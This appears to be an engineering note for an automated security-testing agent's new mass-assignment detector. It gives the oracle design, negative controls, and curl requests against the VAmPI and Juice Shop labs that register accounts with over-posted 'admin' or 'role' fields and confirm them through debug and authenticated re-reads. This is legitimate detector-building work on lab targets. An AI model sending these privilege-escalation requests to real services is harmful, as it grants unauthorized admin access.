# Q-011 - `mass_assignment`: declared in three catalogs, implemented nowhere

Lane: **Builder / massassign**. Owns `agent/mass_assign_tool.py` (new), `agent/tools.py`,
`agent/engine_descriptor.py`, `agent/wstg_catalog.py`, `agent/tests/test_mass_assign_tool.py` (new),
`agent/mutation_gate.py`, this file.

Every claim below is **MEASURED** (command + real output) or **UNVERIFIED**.

---

## 1. The defect, re-measured before touching anything

MEASURED, `grep -rn "mass_assign" --include=*.py .` at `74e383e`:

```
agent/asvs_model.py:135:   "engine": NO_ENGINE, "violated_by": ("mass_assignment",),
agent/engine_descriptor.py:57:    "mass_assignment":         ["has_api"],
agent/techniques.py:624:   _t(id="mass_assignment", vuln_class="access_control", cwe="CWE-915", ...)
agent/techniques.py:1022:  "mass_assignment": ["Admin Registration"],        <- the solver backfill
agent/wstg_catalog.py:104:  "WSTG-INPV-20": "mass_assignment (authz)",
```

No `_run_mass_assignment`, no `run_mass_assignment` in `TOOL_PERMISSIONS`, none in `CLAUDE_TOOLS`.
The only code in the tree that over-posts a privileged attribute is the lab solver
`juiceshop_solvers.py:67` (`_register(c, ..., role="admin")`). Confirmed: the capability did not exist.

---

## 2. The oracle: what CONFIRMED means here

A `200 OK` on the write proves nothing - APIs routinely accept and ignore unknown fields. The oracle
is **persistence observed in a SEPARATE re-read**:

1. create/collect the object's state through a read view (**baseline**),
2. send the write with **exactly one** extra attribute,
3. **re-read the object in a separate request** and assert the privileged field now holds the
   injected value.

Two negative controls, both mandatory, both recorded on the finding under `negative_controls`
(one of `proof_schema.CONTROL_KEYS`, so `report.control_ran` reads an artifact, not a claim):

| control | what it rules out | verdict when it fires |
|---|---|---|
| **ignored-field** - the same write carrying `apolaki_probe_<nonce>` | the endpoint echoes arbitrary attributes back, so persistence proves nothing | `clean` |
| **baseline** - the field's value on an object created WITHOUT the injection | the field already held the value (`role: user` that was always `user`; an object born admin) | `clean` |

A control that did not RUN caps the verdict at `lead`. So does a failed re-read.

---

## 3. Live measurements on the labs (before writing any code)

### 3a. VAmPI (`apolaki-vampi-1:5000`) - CONFIRMED mass-assignable

```
$ curl -s -X POST http://apolaki-vampi-1:5000/users/v1/register -H 'Content-Type: application/json' \
    -d '{"username":"apolaki_probe_t2","password":"...","email":"...","admin":true}'
{"message": "Successfully registered. Login to receive an auth token.", "status": "success"}

$ curl -s http://apolaki-vampi-1:5000/users/v1/_debug        # SEPARATE re-read
  ... {"admin": true,  "email": "apolaki_probe_t2@example.com", "username": "apolaki_probe_t2"}
```

Both controls MEASURED on the same host, same nonce run (`nonce=27495`):

```
ignored-field:  POST ... -d '{"username":"apolaki_ctl_27495", ..., "apolaki_probe_27495":"CTLVAL"}'
  re-read ->  {"admin": false, "email": "apolaki_ctl_27495@...", "username": "apolaki_ctl_27495"}
              the invented attribute is ABSENT. The endpoint does not echo arbitrary fields.
baseline:       POST ... -d '{"username":"apolaki_base_27495", ...}'      (no extra attribute)
  re-read ->  {"admin": false, ...}
              the field did not already hold `true`.
```

Seeded users `name1`/`name2` read back `"admin": false`, so `true` is not this API's default.

**The re-read view matters and is not the obvious one.** MEASURED:

```
GET /users/v1/{username}  ->  {"username": "...", "email": "..."}          # admin NOT exposed
GET /users/v1             ->  [{"username","email"}, ...]                  # admin NOT exposed
GET /users/v1/_debug      ->  [{"admin","email","password","username"}...] # admin exposed
```

`_debug` is **declared in VAmPI's own OpenAPI spec**, so it is reachable generally, with no lab
knowledge - MEASURED via `surface.operations_from_openapi` on the live spec:

```
GET / | GET /books/v1 | GET /books/v1/{book_title} | GET /createdb | GET /me
GET /users/v1 | GET /users/v1/_debug | GET /users/v1/{username}
```

This drove a design decision (section 4): **the read view is selected from the observed spec against
the BASELINE object**, before any injected value exists, so the choice cannot be result-shopping.

The same spec proves the field is not offered - `POST /users/v1/register` declares exactly
`email`, `password`, `username` (MEASURED, `operations_from_openapi`). `admin` is bound anyway.

### 3b. Juice Shop bench (`apolaki-juice-shop-bench-1:3000`) - CONFIRMED mass-assignable

```
$ curl -s -X POST .../api/Users -H 'Content-Type: application/json' \
    -d '{"email":"apolaki_ma_18708@example.com","password":"...","role":"admin","apolaki_probe_18708":"CTLVAL"}'
{"status":"success","data":{... "id":24, "role":"admin" ...}}     # invented attribute NOT echoed

$ curl -s .../api/Users/24 -H "Authorization: Bearer <token from /rest/user/login>"   # SEPARATE re-read
{"status":"success","data":{"id":24, "email":"apolaki_ma_18708@example.com", "role":"admin", ...}}
```

MEASURED constraint: the re-read is **authentication-gated**.
`GET /api/Users/24` and `GET /api/Users` anonymously both return
`UnauthorizedError: No Authorization header was found`. The engine therefore has to hold a read
session; see section 4 (`read_headers` / login-as-the-created-identity).

### 3c. Objects this lane created on shared labs (for an operator to undo)

VAmPI `apolaki-vampi-1` now carries these accounts, created by hand during the measurements above:

| username | admin | why |
|---|---|---|
| `apolaki_probe_t1` | **true** | first mass-assignment probe |
| `apolaki_probe_t2` | **true** | second mass-assignment probe |
| `apolaki_ctl_27495` | false | ignored-field control |
| `apolaki_base_27495` | false | baseline control |

Juice Shop bench: user id 24, `apolaki_ma_18708@example.com`, **role `admin`**.

None of these escalated a pre-existing account - every one is an object this lane minted. VAmPI
resets via `GET /createdb`, deliberately NOT called: other lanes are using the same container.

---

## 4. Design

`agent/mass_assign_tool.py` is a pure oracle (no network), mirroring `create_object_idor.py`:
byte-decisions here, HTTP in `tools.ToolRegistry._run_mass_assignment`.

Per write endpoint the driver runs:

```
A. baseline object   POST <minimal valid body>                      -> re-read through each
                                                                       candidate view
                     -> which views expose which candidate fields, and with what value
B. ignored-field     POST <minimal body + apolaki_probe_<nonce>>    -> re-read
   control              the invented name cannot pre-exist, so its PRESENCE alone is echo
C. per field         POST <minimal body + ONE privileged field>     -> re-read through the view
                                                                       chosen in A for that field
```

Candidate privileged names come from `mass_assign_tool.PRIVILEGED_FIELDS`, a general list
(`role`, `isAdmin`, `is_admin`, `admin`, `verified`, `isVerified`, ...). Fields the endpoint already
OFFERS are excluded - setting a documented parameter is the API working, not mass assignment.
No benchmark answer key, no lab endpoint names.

---

## 5. Status

- [x] measurements above - MEASURED
- [x] slice 1: pure oracle + tests, committed before any wiring
- [x] slice 2: driver + reachability
- [x] slice 3: live validation
- [x] slice 4: mutant + catalog corrections
